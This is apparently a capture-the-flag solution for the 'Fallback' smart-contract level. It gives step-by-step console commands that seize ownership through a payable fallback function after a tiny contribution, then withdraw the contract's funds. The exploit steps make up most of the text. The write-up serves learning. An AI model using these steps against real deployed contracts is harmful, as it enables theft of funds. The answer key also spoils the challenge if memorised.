## Fallback Solution


1. Check current contract balance  
`fromWei(await getBalance(contract.address))`  
"0"

2. Check owner contributions  
`fromWei(await contract.contributions(await contract.owner()))`  
"1000"

3. Fallback payable function changes the contract's owner but senders contributions must be bigger than 0  
`contract.contribute({value: toWei(0.0001)});`

4. Check if contribution is valid  
`fromWei(await contract.contributions(player))`  
"0.0001"

5. Call fallback payable function  
`await contract.sendTransaction({from: player, value: toWei(0.001), gas: 90000 })`

6. Check if player is the owner.  
`player === (await contract.owner())`  
true

7. Withdraw funds.  
`await contract.withdraw()`

8. Submit Instance 🎉
